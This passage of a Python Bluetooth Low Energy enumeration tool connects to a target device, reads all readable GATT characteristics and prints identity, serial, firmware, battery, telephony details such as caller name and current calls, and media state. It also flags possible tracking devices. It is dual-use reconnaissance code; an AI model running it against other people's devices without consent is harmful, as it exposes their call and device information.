        "7e846e42-fc81-4e53-8a2a-0d94a9e05f82": ("Sonos Control", "Sonos", "Speaker control"),
        # Google Fast Pair
        "fe2c1234-8366-4814-8eb0-01de32100bea": ("Google Fast Pair", "Google", "Fast Pair model ID"),
        "fe2c1235-8366-4814-8eb0-01de32100bea": ("Google Fast Pair Key", "Google", "Fast Pair key-based pairing"),
        "fe2c1236-8366-4814-8eb0-01de32100bea": ("Google Fast Pair Passkey", "Google", "Fast Pair passkey"),
        # Microsoft Swift Pair
        "0000fef3-0000-1000-8000-00805f9b34fb": ("Microsoft Swift Pair", "Microsoft", "Windows Swift Pair data"),
    }

    # Appearance values
    APPEARANCES = {
        0: "Unknown",
        64: "Phone",
        128: "Computer",
        192: "Watch",
        193: "Watch (Sports)",
        256: "Clock",
        320: "Display",
        384: "Remote Control",
        448: "Eye Glasses",
        512: "Tag",
        576: "Keyring",
        640: "Media Player",
        704: "Barcode Scanner",
        768: "Thermometer",
        832: "Heart Rate Sensor",
        896: "Blood Pressure",
        960: "HID",
        961: "Keyboard",
        962: "Mouse",
        963: "Joystick",
        964: "Gamepad",
        965: "Digitizer Tablet",
        966: "Card Reader",
        967: "Digital Pen",
        968: "Barcode Scanner (HID)",
        1024: "Glucose Meter",
        1088: "Running/Walking Sensor",
        1152: "Cycling",
        1216: "Control Device",
        1280: "Network Device",
        1344: "Sensor",
        1408: "Light Fixtures",
        1472: "Fan",
        1536: "HVAC",
        1600: "Air Conditioning",
        1664: "Humidifier",
        1728: "Heating",
        1792: "Access Control",
        1856: "Motorized Device",
        1920: "Power Device",
        1984: "Light Source",
        2048: "Window Covering",
        2112: "Audio Sink",
        2113: "Standalone Speaker",
        2114: "Soundbar",
        2115: "Bookshelf Speaker",
        2116: "Standmounted Speaker",
        2117: "Speakerphone",
        2176: "Audio Source",
        2177: "Microphone",
        2178: "Alarm",
        2240: "Wearable",
        2241: "Wristwatch",
        2242: "Pager",
        2243: "Jacket",
        2244: "Helmet",
        2245: "Glasses",
        2304: "Generic Outdoor Sports",
        2305: "Location Display",
        2306: "Location/Navigation Display",
        2307: "Location Pod",
        2308: "Location/Navigation Pod",
        3136: "Pulse Oximeter",
        3200: "Weight Scale",
        3264: "Personal Mobility Device",
        3328: "Insulin Pen",
        3392: "Continuous Glucose Monitor",
        5184: "Hearing Aid",
        5185: "In-Ear Hearing Aid",
        5186: "Behind-Ear Hearing Aid",
        5187: "Cochlear Implant",
    }

    term_width = shutil.get_terminal_size((80, 24)).columns

    def print_header(text):
        print(f"\n\033[1;36m{'─' * term_width}\033[0m")
        print(f"\033[1;36m  {text}\033[0m")
        print(f"\033[1;36m{'─' * term_width}\033[0m")

    def print_field(label, value, indent=2):
        if value:
            print(f"{' ' * indent}\033[1;33m{label}:\033[0m {value}")

    print(f"\n\033[1;36m{'═' * term_width}\033[0m")
    print(f"\033[1;36m  BLE DEVICE ENUMERATION\033[0m")
    print(f"\033[1;36m{'═' * term_width}\033[0m")
    print(f"\n  Target: \033[1;32m{target_address}\033[0m")
    print(f"  Connecting...\n")

    device = None
    connection = None
    t = None
    peer = None
    max_retries = 3

    try:
        t = await open_transport_or_link(controller)
        config = DeviceConfiguration()
        config.keystore = "JsonKeyStore"
        config.address = Address.generate_static_address()
        config.name = "BLEEnumerator"
        device = Device.from_config_with_hci(config, t.source, t.sink)
        await device.power_on()

        # Parse address - check for explicit type suffix
        addr_str = target_address.replace("/P", "").replace("/R", "")
        if "/P" in target_address:
            # Explicit public address
            address_types = [(Address.PUBLIC_DEVICE_ADDRESS, "public")]
        elif "/R" in target_address:
            # Explicit random address
            address_types = [(Address.RANDOM_DEVICE_ADDRESS, "random")]
        else:
            # Auto-detect: try public first (most common for commercial devices), then random
            address_types = [
                (Address.PUBLIC_DEVICE_ADDRESS, "public"),
                (Address.RANDOM_DEVICE_ADDRESS, "random")
            ]

        # Try each address type
        for addr_type, addr_type_name in address_types:
            target = Address(addr_str, addr_type)
            connection = None

            if len(address_types) > 1:
                print(f"  \033[1;33mTrying {addr_type_name} address...\033[0m")

            # Retry loop for connection and discovery
            for attempt in range(1, max_retries + 1):
                # Connect to target
                if attempt > 1:
                    print(
                        f"\n  \033[1;33mRetry {attempt}/{max_retries}...\033[0m")
                    # Cancel any pending connection and reset controller state
                    try:
                        await device.host.send_command(
                            bumble.hci.HCI_LE_Create_Connection_Cancel_Command()
                        )
                    except Exception:
                        pass
                    await asyncio.sleep(2.0)  # Give controller time to reset

                print(
                    f"  \033[1;33mConnecting to {addr_str} ({addr_type_name})...\033[0m")

                try:
                    connection = await asyncio.wait_for(
                        device.connect(target),
                        timeout=timeout
                    )
                except asyncio.TimeoutError:
                    print(
                        f"  \033[1;31mConnection timed out after {timeout}s\033[0m")
                    # Cancel the pending connection
                    try:
                        await device.host.send_command(
                            bumble.hci.HCI_LE_Create_Connection_Cancel_Command()
                        )
                    except Exception:
                        pass
                    if attempt == max_retries:
                        break  # Try next address type
                    continue
                except Exception as e:
                    err_str = str(e)
                    print(f"  \033[1;31mConnection failed: {e}\033[0m")

                    # Check for errors that indicate we should retry with same address type
                    retry_errors = [
                        "UNKNOWN_CONNECTION_IDENTIFIER",
                        "CONNECTION_FAILED_TO_BE_ESTABLISHED",
                        "REMOTE_USER_TERMINATED",
                        "CONNECTION_TIMEOUT",
                    ]
                    should_retry = any(err in err_str for err in retry_errors)

                    if should_retry and attempt < max_retries:
                        print(
                            f"  \033[0;90m(This error is often transient, retrying...)\033[0m")
                        await asyncio.sleep(1.0)
                        continue

                    if attempt == max_retries:
                        break  # Try next address type
                    continue

                print(f"  \033[1;32mConnected!\033[0m")
                print(f"  Connection Handle: 0x{connection.handle:04X}")

                # Create peer for GATT operations
                peer = Peer(connection)

                print(f"\n  \033[1;33mDiscovering GATT services...\033[0m")
                try:
                    await asyncio.wait_for(peer.discover_services(), timeout=15.0)
                    await asyncio.wait_for(peer.discover_characteristics(), timeout=15.0)
                    # Success - break out of both loops
                    break
                except asyncio.TimeoutError:
                    print(f"  \033[1;31mService discovery timed out\033[0m")
                    try:
                        await connection.disconnect()
                    except Exception:
                        pass
                    connection = None
                    peer = None
                    if attempt == max_retries:
                        break  # Try next address type
                    continue
                except (asyncio.CancelledError, Exception) as e:
                    err_msg = "Connection lost" if isinstance(
                        e, asyncio.CancelledError) else str(e)
                    print(
                        f"  \033[1;31mService discovery failed: {err_msg}\033[0m")
                    try:
                        if connection:
                            await connection.disconnect()
                    except Exception:
                        pass
                    connection = None
                    peer = None
                    if attempt == max_retries:
                        break  # Try next address type
                    continue

            # If we connected successfully, break out of address type loop
            if connection and peer:
                break

        if not peer or not connection:
            print(
                f"  \033[1;31mFailed to connect with any address type\033[0m")
            print(f"\n  \033[1;33mPossible reasons:\033[0m")
            print(f"    • Device may have changed its MAC address (BLE privacy/RPA)")
            print(f"    • Device may be out of range or powered off")
            print(f"    • Device may be connected to another host")
            print(f"    • Device may require the screen to be unlocked")
            print(f"\n  \033[1;33mSuggestions:\033[0m")
            print(
                f"    • Run '\033[1;36mble-scan\033[0m' again to find the current address")
            print(f"    • Make sure the device is discoverable (BT settings open)")
            print(f"    • Try moving closer to the device")
            print(f"    • Disconnect the device from other paired hosts")
            return

        # Collect device info
        device_info = {
            "name": None,
            "appearance": None,
            "appearance_name": None,
            "manufacturer": None,
            "model": None,
            "serial": None,
            "firmware": None,
            "hardware": None,
            "software": None,
            "battery": None,
        }

        services_found = []

        for service in peer.services:
            service_uuid = str(service.uuid).lower()
            service_name, service_icon = SERVICE_TYPES.get(
                service_uuid, (f"Unknown ({service.uuid})", "❓")
            )
            services_found.append(
                (service_uuid, service_name, service_icon, service))

            # Helper to check if UUID matches (handles both full and short format)
            def uuid_matches(char_uuid, short_id):
                """Check if characteristic UUID matches a short ID like '2a00'."""
                full_uuid = f"0000{short_id}-0000-1000-8000-00805f9b34fb"
                short_format = f"uuid-16:{short_id}"
                return char_uuid == full_uuid or char_uuid == short_format or short_id in char_uuid

            # Try to read characteristics
            for char in service.characteristics:
                try:
                    char_uuid_str = str(char.uuid).lower()

                    # Generic Access - Device Name (0x2A00)
                    if char.uuid == GATT_DEVICE_NAME_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a00"):
                        value = await peer.read_value(char)
                        if value:
                            device_info["name"] = value.decode(
                                'utf-8', errors='replace').strip('\x00')

                    # Generic Access - Appearance (0x2A01)
                    elif char.uuid == GATT_APPEARANCE_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a01"):
                        value = await peer.read_value(char)
                        if value and len(value) >= 2:
                            appearance = struct.unpack('<H', value[:2])[0]
                            device_info["appearance"] = appearance
                            device_info["appearance_name"] = APPEARANCES.get(
                                appearance, f"Unknown (0x{appearance:04X})"
                            )

                    # Device Information Service characteristics
                    elif char.uuid == GATT_MANUFACTURER_NAME_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a29"):
                        value = await peer.read_value(char)
                        if value:
                            device_info["manufacturer"] = value.decode(
                                'utf-8', errors='replace').strip('\x00')

                    elif char.uuid == GATT_MODEL_NUMBER_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a24"):
                        value = await peer.read_value(char)
                        if value:
                            device_info["model"] = value.decode(
                                'utf-8', errors='replace').strip('\x00')

                    elif char.uuid == GATT_SERIAL_NUMBER_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a25"):
                        value = await peer.read_value(char)
                        if value:
                            device_info["serial"] = value.decode(
                                'utf-8', errors='replace').strip('\x00')

                    elif char.uuid == GATT_FIRMWARE_REVISION_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a26"):
                        value = await peer.read_value(char)
                        if value:
                            device_info["firmware"] = value.decode(
                                'utf-8', errors='replace').strip('\x00')

                    elif char.uuid == GATT_HARDWARE_REVISION_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a27"):
                        value = await peer.read_value(char)
                        if value:
                            # Try to decode as UTF-8 string first
                            decoded = value.decode(
                                'utf-8', errors='replace').strip('\x00')
                            if decoded and decoded.isprintable():
                                device_info["hardware"] = decoded
                            else:
                                # Binary format - interpret as version bytes
                                if len(value) >= 2:
                                    version_parts = [str(b) for b in value]
                                    device_info["hardware"] = '.'.join(
                                        version_parts)
                                elif len(value) == 1:
                                    device_info["hardware"] = f"Rev {value[0]}"
                                else:
                                    device_info["hardware"] = value.hex()
                            logging.debug(
                                f"Read hardware revision: {value.hex()} -> '{device_info['hardware']}'")

                    elif char.uuid == GATT_SOFTWARE_REVISION_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a28"):
                        logging.debug(
                            f"Found software revision characteristic: {char.uuid}")
                        try:
                            value = await peer.read_value(char)
                            logging.debug(
                                f"Software revision raw value: {value.hex() if value else 'None'}")
                            if value:
                                # Try to decode as UTF-8 string first
                                decoded = value.decode(
                                    'utf-8', errors='replace').strip('\x00')
                                if decoded and decoded.isprintable():
                                    device_info["software"] = decoded
                                else:
                                    # Binary format - interpret as version bytes
                                    if len(value) >= 2:
                                        # Common format: major.minor or major.minor.patch.build
                                        version_parts = [str(b) for b in value]
                                        device_info["software"] = '.'.join(
                                            version_parts)
                                    else:
                                        device_info["software"] = value.hex()
                                logging.debug(
                                    f"Read software revision: {value.hex()} -> '{device_info['software']}'")
                            else:
                                device_info["software"] = None
                        except Exception as read_err:
                            logging.debug(
                                f"Failed to read software revision: {read_err}")

                    # Battery Level (0x2A19)
                    elif uuid_matches(char_uuid_str, "2a19"):
                        value = await peer.read_value(char)
                        if value:
                            device_info["battery"] = value[0]

                    # Battery Power State (0x2A1A)
                    elif uuid_matches(char_uuid_str, "2a1a"):
                        value = await peer.read_value(char)
                        if value:
                            device_info["battery_state"] = value[0]

                except Exception as e:
                    logging.debug(
                        f"Failed to read characteristic {char.uuid}: {e}")

        # Determine device type from multiple signals
        device_types = []
        device_name_lower = (device_info.get("name") or "").lower()
        manufacturer_lower = (device_info.get("manufacturer") or "").lower()
        appearance_name = (device_info.get("appearance_name") or "").lower()

        # Check device name for keywords
        audio_keywords = ["speaker", "headphone", "earphone", "earbud", "headset",
                          "soundbar", "audio", "music", "sound", "bass", "subwoofer",
                          "amp", "amplifier", "receiver", "stereo", "hifi", "hi-fi"]
        watch_keywords = ["watch", "band",
                          "tracker", "fit", "garmin", "fitbit"]
        keyboard_keywords = ["keyboard", "keys", "keeb", "mechanical"]
        mouse_keywords = ["mouse", "trackpad", "trackball", "pointing"]
        phone_keywords = ["phone", "mobile", "samsung",
                          "iphone", "android", "pixel", "galaxy", "oneplus", "xiaomi", "huawei"]
        tv_keywords = ["tv", "television", "roku",
                       "firestick", "chromecast", "appletv"]

        for keyword in audio_keywords:
            if keyword in device_name_lower:
                device_types.append("🔊 Bluetooth Speaker/Audio")
                break

        for keyword in watch_keywords:
            if keyword in device_name_lower or keyword in appearance_name:
                device_types.append("⌚ Smartwatch/Fitness Tracker")
                break

        for keyword in keyboard_keywords:
            if keyword in device_name_lower:
                device_types.append("⌨️ Keyboard")
                break

        for keyword in mouse_keywords:
            if keyword in device_name_lower:
                device_types.append("🖱️ Mouse/Pointing Device")
                break

        for keyword in phone_keywords:
            if keyword in device_name_lower:
                device_types.append("📱 Mobile Phone")
                break

        for keyword in tv_keywords:
            if keyword in device_name_lower:
                device_types.append("📺 TV/Streaming Device")
                break

        # Check manufacturer for hints
        audio_manufacturers = ["logitech", "bose", "sony", "jbl", "harman", "beats",
                               "sennheiser", "audio-technica", "skullcandy", "jabra",
                               "anker", "soundcore", "marshall", "bang & olufsen", "b&o",
                               "sonos", "ultimate ears", "ue", "creative", "edifier"]

        for mfr in audio_manufacturers:
            if mfr in manufacturer_lower or mfr in device_name_lower:
                if "🔊 Bluetooth Speaker/Audio" not in device_types:
                    device_types.append("🔊 Audio Device (by manufacturer)")
                break

        # Check services for device type hints
        # Phone services take priority - these are definitive indicators
        phone_service_uuids = [
            "184c",  # Generic Telephone Bearer
            "184e",  # Audio Stream Control
            "1855",  # Telephony and Media Audio (TMAP)
        ]
        phone_service_names = ["telephone", "telephony", "call", "phone"]

        has_phone_service = False
        for service_uuid, service_name, service_icon, _ in services_found:
            uuid_lower = str(service_uuid).lower()
            name_lower = service_name.lower()

            # Check for phone-specific services FIRST
            if any(ps in uuid_lower for ps in phone_service_uuids) or any(pn in name_lower for pn in phone_service_names):
                has_phone_service = True

            # Only classify as audio device if it's purely audio (no phone services)
            if "HID" in service_name:
                if "🎮 Input Device (HID)" not in device_types:
                    device_types.append("🎮 Input Device (HID)")
            if "Heart Rate" in service_name:
                device_types.append("❤️ Fitness/Health Device")
            if "AirPods" in service_name or "apple" in service_name.lower():
                device_types.append("🎧 Apple AirPods")

        # Add phone type if phone services detected (takes priority over audio)
        if has_phone_service:
            if "📱 Mobile Phone" not in device_types:
                device_types.append("📱 Mobile Phone")
        else:
            # Only classify as audio device if NO phone services present
            for service_uuid, service_name, service_icon, _ in services_found:
                if "Audio" in service_name or "Handsfree" in service_name or "A2DP" in service_name:
                    if "🔊 Bluetooth Speaker/Audio" not in device_types and "🔊 Audio Device (by manufacturer)" not in device_types:
                        device_types.append("🔊 Audio Device")
                    break

        # Check appearance for device type
        if "headphone" in appearance_name or "headset" in appearance_name:
            if not any("Audio" in dt or "Speaker" in dt for dt in device_types):
                device_types.append("🎧 Headphones/Headset")
        if "speaker" in appearance_name:
            if not any("Audio" in dt or "Speaker" in dt for dt in device_types):
                device_types.append("🔊 Speaker")
        if "keyboard" in appearance_name:
            if "⌨️ Keyboard" not in device_types:
                device_types.append("⌨️ Keyboard")
        if "mouse" in appearance_name:
            if "🖱️ Mouse/Pointing Device" not in device_types:
                device_types.append("🖱️ Mouse")
        if "watch" in appearance_name:
            if not any("Watch" in dt or "Fitness" in dt for dt in device_types):
                device_types.append("⌚ Watch")
        if "phone" in appearance_name:
            if "📱 Mobile Phone" not in device_types:
                device_types.append("📱 Phone")

        if not device_types:
            device_types = ["❓ Generic BLE Device"]

        # Print Services FIRST
        print_header(f"GATT SERVICES ({len(services_found)} found)")
        print(f"  \033[1;33m📖 Reading all readable characteristics...\033[0m\n")

        # Track unknown characteristics for research guidance
        unknown_characteristics = []

        # Store all read values for comprehensive summary
        all_read_values = []

        for service_uuid, service_name, service_icon, service in services_found:
            # Show full UUID for standard services as 0xXXXX, or full 128-bit for custom
            if service_uuid.startswith("0000") and service_uuid.endswith("-0000-1000-8000-00805f9b34fb"):
                display_uuid = f"0x{service_uuid[4:8].upper()} (Bluetooth SIG Standard)"
            else:
                display_uuid = service_uuid

            print(f"\n  {service_icon} \033[1;32m{service_name}\033[0m")
            print(f"     UUID: \033[0;36m{display_uuid}\033[0m")
            print(f"     Characteristics: {len(service.characteristics)}")

            for char in service.characteristics:
                props = []
                can_read = False
                if char.properties & 0x01:
                    props.append("Broadcast")
                if char.properties & 0x02:
                    props.append("Read")
                    can_read = True
                if char.properties & 0x04:
                    props.append("WriteNoResp")
                if char.properties & 0x08:
                    props.append("Write")
                if char.properties & 0x10:
                    props.append("Notify")
                if char.properties & 0x20:
                    props.append("Indicate")
                if char.properties & 0x40:
                    props.append("AuthWrite")
                if char.properties & 0x80:
                    props.append("ExtProps")

                char_uuid = str(char.uuid).lower()

                # Look up characteristic name
                char_name = None
                char_desc = None
                char_vendor = None
                is_standard_char = False
                short_id = None

                # Check standard Bluetooth SIG characteristics
                # Handle both full UUID format and Bumble's short format (uuid-16:XXXX)
                if char_uuid.startswith("0000") and char_uuid.endswith("-0000-1000-8000-00805f9b34fb"):
                    # Full 128-bit format: 0000XXXX-0000-1000-8000-00805f9b34fb
                    short_id = char_uuid[4:8]
                    if short_id in CHARACTERISTIC_NAMES:
                        char_name, char_desc = CHARACTERISTIC_NAMES[short_id]
                    display_char_uuid = f"0x{short_id.upper()}"
                    is_standard_char = True
                elif char_uuid.startswith("uuid-16:"):
                    # Bumble short format: uuid-16:XXXX
                    short_id = char_uuid.split(":")[1].lower()
                    if short_id in CHARACTERISTIC_NAMES:
                        char_name, char_desc = CHARACTERISTIC_NAMES[short_id]
                    display_char_uuid = f"0x{short_id.upper()}"
                    is_standard_char = True
                else:
                    display_char_uuid = char_uuid
                    # Check vendor-specific characteristics
                    if char_uuid in VENDOR_CHARACTERISTICS:
                        char_name, char_vendor, char_desc = VENDOR_CHARACTERISTICS[char_uuid]

                if char_name and char_vendor:
                    # Known vendor-specific characteristic
                    print(f"       • \033[1;33m{char_name}\033[0m")
                    print(f"         UUID: {display_char_uuid}")
                    print(f"         Vendor: \033[1;35m{char_vendor}\033[0m")
                    print(f"         \033[0;90m{char_desc}\033[0m")
                    print(f"         Properties: [{', '.join(props)}]")
                elif char_name:
                    # Known standard characteristic
                    print(
                        f"       • \033[1;33m{char_name}\033[0m ({display_char_uuid})")
                    print(f"         \033[0;90m{char_desc}\033[0m")
                    print(f"         Properties: [{', '.join(props)}]")
                elif is_standard_char:
                    # Standard Bluetooth SIG characteristic but not in our lookup table
                    print(
                        f"       • \033[0;37m{display_char_uuid}\033[0m (Bluetooth SIG): [{', '.join(props)}]")
                else:
                    # Unknown vendor characteristic
                    print(
                        f"       • \033[0;37m{display_char_uuid}\033[0m: [{', '.join(props)}]")
                    print(
                        f"         \033[0;90m⚠ Unknown vendor characteristic\033[0m")
                    unknown_characteristics.append(
                        (char_uuid, props, service_name))

                # Read and display value if --read-all is specified and characteristic is readable
                # Always read readable characteristics for comprehensive enumeration
                if can_read:
                    try:
                        value = await asyncio.wait_for(peer.read_value(char), timeout=5.0)
                        if value:
                            # Format the value based on characteristic type
                            formatted_value = format_characteristic_value(
                                short_id, char_name, value, APPEARANCES)
                            print(
                                f"         \033[1;36m→ Value:\033[0m {formatted_value}")
                            all_read_values.append(
                                (char_name or display_char_uuid, short_id, service_name, formatted_value, value))
                    except asyncio.TimeoutError:
                        print(f"         \033[0;90m→ Read timeout\033[0m")
                    except Exception as e:
                        err_str = str(e)
                        if "INSUFFICIENT_AUTHENTICATION" in err_str or "AUTHENTICATION" in err_str:
                            print(
                                f"         \033[0;33m→ Requires authentication/pairing\033[0m")
                        elif "INSUFFICIENT_ENCRYPTION" in err_str or "ENCRYPTION" in err_str:
                            print(
                                f"         \033[0;33m→ Requires encryption\033[0m")
                        elif "READ_NOT_PERMITTED" in err_str:
                            print(
                                f"         \033[0;90m→ Read not permitted\033[0m")
                        else:
                            logging.debug(f"Read failed for {char_uuid}: {e}")
                            print(
                                f"         \033[0;90m→ Read failed: {err_str[:50]}\033[0m")

        # Show unknown characteristics count
        if unknown_characteristics:
            print(
                f"\n  \033[0;33m⚠ Found {len(unknown_characteristics)} unknown vendor characteristic(s)\033[0m")

        # Automated research for unknown characteristics
        if unknown_characteristics:
            print_header("RESEARCHING UNKNOWN CHARACTERISTICS")
            print(
                f"  \033[0;90mPerforming automated lookups for {len(unknown_characteristics)} unknown characteristic(s)...\033[0m\n")

            try:
                research = await research_unknown_characteristics(unknown_characteristics, target_address)
                print_research_results(
                    research, unknown_characteristics, term_width)
            except Exception as e:
                logging.debug(f"Research failed: {e}")
                print(
                    f"  \033[0;33m⚠ Automated research failed (network issue?)\033[0m")
                print(f"  \033[0;90mManual research URLs:\033[0m")
                mac_parts = target_address.replace("/P", "").split(":")
                if len(mac_parts) >= 3:
                    oui = "".join(mac_parts[:3]).upper()
                    print(
                        f"    → https://maclookup.app/search/result?mac={oui}")
                print(
                    f"    → https://github.com/NordicSemiconductor/bluetooth-numbers-database")
                for uuid, _, _ in unknown_characteristics[:3]:
                    print(f"    → Google: \"{uuid}\"")

        # Build comprehensive device summary from all read values
        print_header("DEVICE SUMMARY")

        # Create a lookup dict from all_read_values for easy access
        # all_read_values format: (char_name, short_id, service_name, formatted_value, raw_value)
        read_values_by_id = {}
        read_values_by_name = {}
        for char_name, short_id, service_name, formatted_value, raw_value in all_read_values:
            if short_id:
                read_values_by_id[short_id.lower()] = (
                    char_name, formatted_value, raw_value)
            if char_name:
                read_values_by_name[char_name] = (formatted_value, raw_value)

        # ═══════════════════════════════════════════════════════════════════
        # TRACKER DETECTION WARNING
        # ═══════════════════════════════════════════════════════════════════
        tracker_services_found = []
        tracker_service_uuids = ["fd43", "fd44", "feed",
                                 "feec", "fd84", "fe33", "fe65", "fd5a", "fd6f"]
        for svc_uuid, svc_name, svc_icon, svc in services_found:
            # Check short UUID format
            short_uuid = svc_uuid.split(
                "-")[0].replace("0000", "") if "-" in svc_uuid else svc_uuid
            if any(tracker_uuid in svc_uuid.lower() or tracker_uuid == short_uuid for tracker_uuid in tracker_service_uuids):
                # Look up the tracker type
                spec = KNOWN_BLE_SPECIFICATIONS.get(short_uuid, {})
                tracker_name = spec.get("name", svc_name) if spec else svc_name
                tracker_services_found.append((short_uuid, tracker_name))

        if tracker_services_found:
            print(
                f"\n  \033[1;31m╔══════════════════════════════════════════════════════════════╗\033[0m")
            print(
                f"  \033[1;31m║  ⚠️  POTENTIAL TRACKING DEVICE DETECTED                       ║\033[0m")
            print(
                f"  \033[1;31m╚══════════════════════════════════════════════════════════════╝\033[0m")
            for tracker_uuid, tracker_name in tracker_services_found:
                print(
                    f"    \033[1;31m• {tracker_name} (0x{tracker_uuid.upper()})\033[0m")
            print(
                f"    \033[0;33mThis device may be a location tracker (AirTag, Tile, etc.)\033[0m")
            print(
                f"    \033[0;33mIf unexpected, check for unwanted tracking: https://support.apple.com/HT212227\033[0m")

        # ═══════════════════════════════════════════════════════════════════
        # BASIC DEVICE IDENTITY
        # ═══════════════════════════════════════════════════════════════════
        print(
            f"\n  \033[1;35m┌─ DEVICE IDENTITY ─────────────────────────────────────────┐\033[0m")
        print_field("Address", target_address, indent=4)
        print_field("Device Type", ", ".join(set(device_types)), indent=4)

        # Get name from read values or device_info
        name = read_values_by_id.get(
            "2a00", (None, device_info.get("name"), None))[1]
        if name and name.startswith('"') and name.endswith('"'):
            name = name[1:-1]  # Remove quotes
        print_field("Name", name, indent=4)

        # Appearance
        if device_info.get("appearance"):
            print_field(
                "Appearance", f"{device_info['appearance_name']} ({device_info['appearance']})", indent=4)

        # Manufacturer, Model, Serial from Device Information Service
        manufacturer = read_values_by_id.get(
            "2a29", (None, device_info.get("manufacturer"), None))[1]
        if manufacturer and manufacturer.startswith('"'):
            manufacturer = manufacturer[1:-1]
        print_field("Manufacturer", manufacturer, indent=4)

        model = read_values_by_id.get(
            "2a24", (None, device_info.get("model"), None))[1]
        if model and model.startswith('"'):
            model = model[1:-1]
        print_field("Model", model, indent=4)

        serial = read_values_by_id.get(
            "2a25", (None, device_info.get("serial"), None))[1]
        if serial and serial.startswith('"'):
            serial = serial[1:-1]
        print_field("Serial Number", serial, indent=4)

        # Version information
        firmware = read_values_by_id.get(
            "2a26", (None, device_info.get("firmware"), None))[1]
        if firmware and firmware.startswith('"'):
            firmware = firmware[1:-1]
        print_field("Firmware", firmware, indent=4)

        hardware = read_values_by_id.get(
            "2a27", (None, device_info.get("hardware"), None))[1]
        if hardware and hardware.startswith('"'):
            hardware = hardware[1:-1]
        print_field("Hardware", hardware, indent=4)

        software = read_values_by_id.get(
            "2a28", (None, device_info.get("software"), None))[1]
        if software and software.startswith('"'):
            software = software[1:-1]
        print_field("Software", software, indent=4)

        # ═══════════════════════════════════════════════════════════════════
        # BATTERY STATUS
        # ═══════════════════════════════════════════════════════════════════
        battery_level = read_values_by_id.get("2a19")
        if battery_level or device_info.get("battery") is not None:
            print(
                f"\n  \033[1;35m┌─ BATTERY STATUS ──────────────────────────────────────────┐\033[0m")
            if battery_level:
                level_str = battery_level[1]
                if level_str.endswith('%'):
                    try:
                        pct = int(level_str.rstrip('%'))
                        bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
                        print_field("Battery Level",
                                    f"{pct}% [{bar}]", indent=4)
                    except:
                        print_field("Battery Level", level_str, indent=4)
                else:
                    print_field("Battery Level", level_str, indent=4)
            elif device_info.get("battery") is not None:
                pct = device_info["battery"]
                bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
                print_field("Battery Level", f"{pct}% [{bar}]", indent=4)

            if device_info.get("battery_state") is not None:
                state_val = device_info["battery_state"]
                states = []
                if state_val & 0x01:
                    states.append("Present")
                if state_val & 0x02:
                    states.append("Discharging")
                if state_val & 0x04:
                    states.append("Charging")
                if state_val & 0x08:
                    states.append("Critical")
                print_field("Battery State", ", ".join(states)
                            if states else f"0x{state_val:02X}", indent=4)

        # ═══════════════════════════════════════════════════════════════════
        # TELEPHONY INFORMATION (from Generic Telephone Bearer Service)
        # ═══════════════════════════════════════════════════════════════════
        telephony_chars = ["2bb3", "2bb4", "2bb5", "2bb6",
                           "2bb9", "2bbd", "2bbb", "2bc1", "2bc2"]
        has_telephony = any(
            cid in read_values_by_id for cid in telephony_chars)

        if has_telephony:
            print(
                f"\n  \033[1;35m┌─ TELEPHONY (Phone/Carrier) ───────────────────────────────┐\033[0m")

            # Bearer Provider Name (carrier)
            if "2bb3" in read_values_by_id:
                carrier = read_values_by_id["2bb3"][1]
                if carrier.startswith('"'):
                    carrier = carrier[1:-1]
                print_field("Carrier/Provider", carrier, indent=4)

            # Bearer UCI
            if "2bb4" in read_values_by_id:
                uci = read_values_by_id["2bb4"][1]
                if uci.startswith('"'):
                    uci = uci[1:-1]
                print_field("Bearer UCI", uci, indent=4)

            # Bearer Technology (network type)
            if "2bb5" in read_values_by_id:
                print_field("Network Technology",
                            read_values_by_id["2bb5"][1], indent=4)

            # URI Schemes
            if "2bb6" in read_values_by_id:
                schemes = read_values_by_id["2bb6"][1]
                if schemes.startswith('"'):
                    schemes = schemes[1:-1]
                print_field("URI Schemes", schemes, indent=4)

            # Call State
            if "2bbd" in read_values_by_id:
                print_field(
                    "Call State", read_values_by_id["2bbd"][1], indent=4)

            # Status Flags
            if "2bbb" in read_values_by_id:
                print_field("Status Flags",
                            read_values_by_id["2bbb"][1], indent=4)

            # Current Calls
            if "2bb9" in read_values_by_id:
                print_field("Current Calls",
                            read_values_by_id["2bb9"][1], indent=4)

            # Incoming Call
            if "2bc1" in read_values_by_id:
                print_field("Incoming Call",
                            read_values_by_id["2bc1"][1], indent=4)

            # Call Friendly Name (caller ID)
            if "2bc2" in read_values_by_id:
                caller = read_values_by_id["2bc2"][1]
                if caller.startswith('"'):
                    caller = caller[1:-1]
                print_field("Caller Name", caller, indent=4)

        # ═══════════════════════════════════════════════════════════════════
        # MEDIA INFORMATION (from Generic Media Control Service)
        # ═══════════════════════════════════════════════════════════════════
        media_chars = ["2b93", "2b97", "2b98", "2b99", "2b9a", "2ba1", "2ba3"]
        has_media = any(cid in read_values_by_id for cid in media_chars)

        if has_media:
            print(
                f"\n  \033[1;35m┌─ MEDIA PLAYBACK ──────────────────────────────────────────┐\033[0m")

            # Media Player Name
            if "2b93" in read_values_by_id:
                player = read_values_by_id["2b93"][1]
                if player.startswith('"'):
                    player = player[1:-1]
                print_field("Media Player", player, indent=4)

            # Media State
            if "2ba3" in read_values_by_id:
                print_field("Playback State",
                            read_values_by_id["2ba3"][1], indent=4)

            # Track Title
            if "2b97" in read_values_by_id:
                title = read_values_by_id["2b97"][1]
                if title.startswith('"'):
                    title = title[1:-1]
                print_field("Track Title", title, indent=4)

            # Track Duration
            if "2b98" in read_values_by_id:
                print_field("Track Duration",
                            read_values_by_id["2b98"][1], indent=4)

            # Track Position
            if "2b99" in read_values_by_id:
                print_field("Track Position",
                            read_values_by_id["2b99"][1], indent=4)

            # Playback Speed
            if "2b9a" in read_values_by_id:
                print_field("Playback Speed",
                            read_values_by_id["2b9a"][1], indent=4)

            # Playing Order
            if "2ba1" in read_values_by_id:
                print_field("Playing Order",
                            read_values_by_id["2ba1"][1], indent=4)

        # ═══════════════════════════════════════════════════════════════════
        # AUDIO CAPABILITIES (from TMAP, Volume Control, etc.)
